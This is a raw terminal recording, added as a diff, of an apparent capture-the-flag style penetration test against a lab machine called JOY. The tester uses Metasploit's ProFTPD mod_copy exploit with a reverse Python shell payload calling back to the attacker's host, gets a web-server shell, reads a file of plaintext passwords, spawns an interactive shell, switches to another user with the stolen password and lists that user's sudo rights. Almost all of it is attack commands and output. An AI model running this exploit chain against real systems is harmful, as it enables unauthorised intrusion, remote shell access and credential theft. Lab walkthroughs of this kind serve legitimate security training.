@@ -1,0 +1,243 @@
+Script started on 2020-09-26 01:17:43-03:00 [TERM="xterm-256color" TTY="/dev/pts/0" COLUMNS="166" LINES="33"]
+root@Pentest:/home/joaofracassi/beco-xpl/joy# clear
+[H[2J[3Jroot@Pentest:/home/joaofracassi/beco-xpl/joy# msfconsole
+[*] Starting the Metasploit Framework console.../[*] Starting the Metasploit Framework console...-[*] Starting the Metasploit Framework console...\[*] starting the Metasploit Framework console...|[*] STarting the Metasploit Framework console.../[*] StArting the Metasploit Framework console...-[*] StaRting the Metasploit Framework console...\[*] StarTing the Metasploit Framework console...|[*] StartIng the Metasploit Framework console.../[*] StartiNg the Metasploit Framework console...-[*] StartinG the Metasploit Framework console...\[*] Starting the Metasploit Framework console...|[*] Starting The Metasploit Framework console.../[*] Starting tHe Metasploit Framework console...-[*] Starting thE Metasploit Framework console...\[*] Starting the Metasploit Framework console...|[*] Starting the metasploit Framework console.../[*] Starting the MEtasploit Framework console...-[*] Starting the MeTasploit Framework console...\[*] Starting the MetAsploit Framework console...|[*] Starting the MetaSploit Framework console.../[*] Starting the MetasPloit Framework console...-[*] Starting the MetaspLoit Framework console...\[*] Starting the MetasplOit Framework console...|[*] Starting the MetasploIt Framework console.../[*] Starting the MetasploiT Framework console...-[*] Starting the Metasploit Framework console...\[*] Starting the Metasploit framework console...|[*] Starting the Metasploit FRamework console.../[*] Starting the Metasploit FrAmework console...-[*] Starting the Metasploit FraMework console...\[*] Starting the Metasploit FramEwork console...|[*] Starting the Metasploit FrameWork console.../[*] Starting the Metasploit FramewOrk console...-[*] Starting the Metasploit FramewoRk console...\[*] Starting the Metasploit FrameworK console...|[*] Starting the Metasploit Framework console.../[*] Starting the Metasploit Framework Console...-[*] Starting the Metasploit Framework cOnsole...\[*] Starting the Metasploit Framework coNsole...|[*] Starting the Metasploit Framework conSole.../[*] Starting the Metasploit Framework consOle...-[*] Starting the Metasploit Framework consoLe...\[*] Starting the Metasploit Framework consolE...|[*] Starting the Metasploit Framework console.../[*] Starting the Metasploit Framework console...-[*] Starting the Metasploit Framework console...\[*] Starting the Metasploit Framework console...|[*] Starting the Metasploit Framework console.../[*] Starting the Metasploit Framework console...-[*] Starting the Metasploit Framework console...\[*] starting the Metasploit Framework console...|[*] STarting the Metasploit Framework console.../[*] StArting the Metasploit Framework console...-[*] StaRting the Metasploit Framework console...\[*] StarTing the Metasploit Framework console...|[*] StartIng the Metasploit Framework console.../[*] StartiNg the Metasploit Framework console...-[*] StartinG the Metasploit Framework console...\[*] Starting the Metasploit Framework console...|[*] Starting The Metasploit Framework console.../[*] Starting tHe Metasploit Framework console...-[*] Starting thE Metasploit Framework console...\[*] Starting the Metasploit Framework console...|[*] Starting the metasploit Framework console.../[*] Starting the MEtasploit Framework console...-[*] Starting the MeTasploit Framework console...\[*] Starting the MetAsploit Framework console...|[*] Starting the MetaSploit Framework console.../[*] Starting the MetasPloit Framework console...-[*] Starting the MetaspLoit Framework console...\[*] Starting the MetasplOit Framework console...|[*] Starting the MetasploIt Framework console.../[*] Starting the MetasploiT Framework console...-[*] Starting the Metasploit Framework console...\[*] Starting the Metasploit framework console...|[*] Starting the Metasploit FRamework console.../[*] Starting the Metasploit FrAmework console...-[*] Starting the Metasploit FraMework console...\[*] Starting the Metasploit FramEwork console...|[*] Starting the Metasploit FrameWork console.../[*] Starting the Metasploit FramewOrk console...-[*] Starting the Metasploit FramewoRk console...\[*] Starting the Metasploit FrameworK console...|[*] Starting the Metasploit Framework console.../[*] Starting the Metasploit Framework Console...-[*] Starting the Metasploit Framework cOnsole...\[*] Starting the Metasploit Framework coNsole...|[*] Starting the Metasploit Framework conSole.../[*] Starting the Metasploit Framework consOle...-[*] Starting the Metasploit Framework consoLe...\[*] Starting the Metasploit Framework consolE...|[*] Starting the Metasploit Framework console.../[*] Starting the Metasploit Framework console...-[*] Starting the Metasploit Framework console...\[*] Starting the Metasploit Framework console...|[*] Starting the Metasploit Framework console.../                                                  
+[0m[36m[0m[31m
+      .:okOOOkdc'           'cdkOOOko:.
+    .xOOOOOOOOOOOOc       cOOOOOOOOOOOOx.
+   :OOOOOOOOOOOOOOOk,   ,kOOOOOOOOOOOOOOO:
+  'OOOOOOOOOkkkkOOOOO: :OOOOOOOOOOOOOOOOOO'
+  oOOOOOOOO.[0m[1mMMMM[0m[31m.oOOOOoOOOOl.[0m[1mMMMM[0m[31m,OOOOOOOOo
+  dOOOOOOOO.[0m[1mMMMMMM[0m[31m.cOOOOOc.[0m[1mMMMMMM[0m[31m,OOOOOOOOx
+  lOOOOOOOO.[0m[1mMMMMMMMMM[0m[31m;d;[0m[1mMMMMMMMMM[0m[31m,OOOOOOOOl
+  .OOOOOOOO.[0m[1mMMM[0m[31m.;[0m[1mMMMMMMMMMMM[0m[31m;[0m[1mMMMM[0m[31m,OOOOOOOO.
+   cOOOOOOO.[0m[1mMMM[0m[31m.OOc.[0m[1mMMMMM[0m[31m'oOO.[0m[1mMMM[0m[31m,OOOOOOOc
+    oOOOOOO.[0m[1mMMM[0m[31m.OOOO.[0m[1mMMM[0m[31m:OOOO.[0m[1mMMM[0m[31m,OOOOOOo
+     lOOOOO.[0m[1mMMM[0m[31m.OOOO.[0m[1mMMM[0m[31m:OOOO.[0m[1mMMM[0m[31m,OOOOOl
+      ;OOOO'[0m[1mMMM[0m[31m.OOOO.[0m[1mMMM[0m[31m:OOOO.[0m[1mMMM[0m[31m;OOOO;
+       .dOOo'[0m[1mWM[0m[31m.OOOOocccxOOOO.[0m[1mMX[0m[31m'xOOd.
+         ,kOl'[0m[1mM[0m[31m.OOOOOOOOOOOOO.[0m[1mM[0m[31m'dOk,
+           :kk;.OOOOOOOOOOOOO.;Ok:
+             ;kOOOOOOOOOOOOOOOk:
+               ,xOOOOOOOOOOOx,
+                 .lOOOOOOOl.
+                    ,dOd,
+                      .[0m[0m
+
+       =[ [33mmetasploit v5.0.101-dev[0m                         ]
++ -- --=[ 2049 exploits - 1108 auxiliary - 344 post       ]
++ -- --=[ 562 payloads - 45 encoders - 10 nops            ]
++ -- --=[ 7 evasion                                       ]
+
+Metasploit tip: Enable HTTP request and response logging with [32mset HttpTrace true[0m
+
+[?1034h[4mmsf5[0m [0m> sest[K[Karch po[Kroftpd
+[0m
+Matching Modules
+================
+
+   #  Name                                         Disclosure Date  Rank       Check  Description
+   -  ----                                         ---------------  ----       -----  -----------
+   0  exploit/freebsd/ftp/proftp_telnet_iac        2010-11-01       [32mgreat[0m      Yes    [45mProFTPD[0m 1.3.2rc3 - 1.3.3b Telnet IAC Buffer Overflow (FreeBSD)
+   1  exploit/linux/ftp/proftp_sreplace            2006-11-26       [32mgreat[0m      Yes    [45mProFTPD[0m 1.2 - 1.3.0 sreplace Buffer Overflow (Linux)
+   2  exploit/linux/ftp/proftp_telnet_iac          2010-11-01       [32mgreat[0m      Yes    [45mProFTPD[0m 1.3.2rc3 - 1.3.3b Telnet IAC Buffer Overflow (Linux)
+   3  exploit/linux/misc/netsupport_manager_agent  2011-01-08       average    No     NetSupport Manager Agent Remote Buffer Overflow
+   4  exploit/unix/ftp/[45mproftpd[0m_133c_backdoor       2010-12-02       [32mexcellent[0m  No     [45mProFTPD[0m-1.3.3c Backdoor Command Execution
+   5  exploit/unix/ftp/[45mproftpd[0m_modcopy_exec        2015-04-22       [32mexcellent[0m  Yes    [45mProFTPD[0m 1.3.5 Mod_Copy Command Execution
+
+
+Interact with a module by name or index, for example [32muse 5[0m or [32muse exploit/unix/ftp/proftpd_modcopy_exec[0m
+
+[4mmsf5[0m [0m> use exploit/unix/ftp/proftpd_modcopy_exec
+[0m[4mmsf5[0m exploit([1m[31munix/ftp/proftpd_modcopy_exec[0m) [0m> options
+[0m
+Module options (exploit/unix/ftp/proftpd_modcopy_exec):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPORT      80               yes       HTTP port (TCP)
+   RPORT_FTP  21               yes       FTP port
+   SITEPATH   /var/www         yes       Absolute writable website path
+   SSL        false            no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI  /                yes       Base path to the website
+   TMPPATH    /tmp             yes       Absolute writable path
+   VHOST                       no        HTTP server virtual host
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   ProFTPD 1.3.5
+
+
+[4mmsf5[0m exploit([1m[31munix/ftp/proftpd_modcopy_exec[0m) [0m> set rhosts 192.168.1.106
+[0mrhosts => 192.168.1.106
+[4mmsf5[0m exploit([1m[31munix/ftp/proftpd_modcopy_exec[0m) [0m> set sitepath /var/www/tryingharderisjoy
+[0msitepath => /var/www/tryingharderisjoy
+[4mmsf5[0m exploit([1m[31munix/ftp/proftpd_modcopy_exec[0m) [0m> set payload cmd/unix/reverse_tcp[K[K[Kpython
+[0mpayload => cmd/unix/reverse_python
+[4mmsf5[0m exploit([1m[31munix/ftp/proftpd_modcopy_exec[0m) [0m> set lhost 192.168.101[K[K.105
+[0mlhost => 192.168.1.105
+[4mmsf5[0m exploit([1m[31munix/ftp/proftpd_modcopy_exec[0m) [0m> set lport 443
+[0mlport => 443
+[4mmsf5[0m exploit([1m[31munix/ftp/proftpd_modcopy_exec[0m) [0m> options
+[0m
+Module options (exploit/unix/ftp/proftpd_modcopy_exec):
+
+   Name       Current Setting             Required  Description
+   ----       ---------------             --------  -----------
+   Proxies                                no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS     192.168.1.106               yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPORT      80                          yes       HTTP port (TCP)
+   RPORT_FTP  21                          yes       FTP port
+   SITEPATH   /var/www/tryingharderisjoy  yes       Absolute writable website path
+   SSL        false                       no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI  /                           yes       Base path to the website
+   TMPPATH    /tmp                        yes       Absolute writable path
+   VHOST                                  no        HTTP server virtual host
+
+
+Payload options (cmd/unix/reverse_python):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  192.168.1.105    yes       The listen address (an interface may be specified)
+   LPORT  443              yes       The listen port
+   SHELL  /bin/bash        yes       The system shell to use.
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   ProFTPD 1.3.5
+
+
+[4mmsf5[0m exploit([1m[31munix/ftp/proftpd_modcopy_exec[0m) [0m> exploit
+[0m
+[1m[34m[*][0m Started reverse TCP handler on 192.168.1.105:443 
+[1m[34m[*][0m 192.168.1.106:80 - 192.168.1.106:21 - Connected to FTP server
+[1m[34m[*][0m 192.168.1.106:80 - 192.168.1.106:21 - Sending copy commands to FTP server
+[1m[34m[*][0m 192.168.1.106:80 - Executing PHP payload /HDNoah.php
+[1m[34m[*][0m Command shell session 1 opened (192.168.1.105:443 -> 192.168.1.106:50994) at 2020-09-26 01:21:54 -0300
+
+[0mid
+uid=33(www-data) gid=33(www-data) groups=33(www-data),123(ossec)
+wha oami
+www-data
+
+ls
+HDNoah.php
+ossec
+cd osee  sec
+ls
+CONTRIB
+LICENSE
+README
+README.search
+css
+htaccess_def.txt
+img
+index.php
+js
+lib
+ossec_conf.php
+patricksecretsofjoy
+setup.sh
+site
+tmp
+cat patricksecretofjoy
+cat: patricksecretofjoy: No such file or directory
+
+cat     cd ossec
+/bin/bash: line 9: cd: ossec: No such file or directory
+cd ..
+
+
+ls
+HDNoah.php
+ossec
+cd    
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data),123(ossec)
+whoami
+www-data
+cd ossec
+ls
+CONTRIB
+LICENSE
+README
+README.search
+css
+htaccess_def.txt
+img
+index.php
+js
+lib
+ossec_conf.php
+patricksecretsofjoy
+setup.sh
+site
+tmp
+cd patricksecretsofjoy
+/bin/bash: line 19: cd: patricksecretsofjoy: Not a directory
+cat patricksecretsofjoy
+credentials for JOY:
+patrick:apollo098765
+root:howtheheckdoiknowwhattherootpasswordis
+
+how would these hack3rs ever find such a page?
+
+
+patricksecretsofjoy^[[H^[[H^[[H^[[H^[[H^[[H^[[H^[[H^[[H                                                       cat patricksecretsofjoy
+credentials for JOY:
+patrick:apollo098765
+root:howtheheckdoiknowwhattherootpasswordis
+
+how would these hack3rs ever find such a page?
+
+python -c 'import pty;pty.spawn(!/bin     ! "/bin/bash")'
+www-data@JOY:/var/www/tryingharderisjoy/ossec$ 
+
+www-data@JOY:/var/www/tryingharderisjoy/ossec$ 
+
+www-data@JOY:/var/www/tryingharderisjoy/ossec$ su patrick
+su patrick
+Password: apollo098765
+
+patrick@JOY:/var/www/tryingharderisjoy/ossec$ 
+
+patrick@JOY:/var/www/tryingharderisjoy/ossec$ 
+
+patrick@JOY:/var/www/tryingharderisjoy/ossec$ sudo -l
+sudo -l
+Matching Defaults entries for patrick on JOY:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User patrick may run the following commands on JOY:
+    (ALL) NOPASSWD: /home/patrick/script/test
+patrick@JOY:/var/www/tryingharderisjoy/ossec$ 
+
+patrick@JOY:/var/www/tryingharderisjoy/ossec$ 
+
+patrick@JOY:/var/www/tryingharderisjoy/ossec$ 
+
+patrick@JOY:/var/www/tryingharderisjoy/ossec$ exit
+exit
+exit
+www-data@JOY:/var/www/tryingharderisjoy/ossec$ exit
+exit
+exit
+^C
+Abort session 1? [y/N]  y
+
+[1m[34m[*][0m 192.168.1.106 - Command shell session 1 closed.  Reason: User exit
+[4mmsf5[0m exploit([1m[31munix/ftp/proftpd_modcopy_exec[0m) [0m> exit
+[0mroot@Pentest:/home/joaofracassi/beco-xpl/joy# exit
+exit
+
+Script done on 2020-09-26 01:42:30-03:00 [COMMAND_EXIT_CODE="0"]
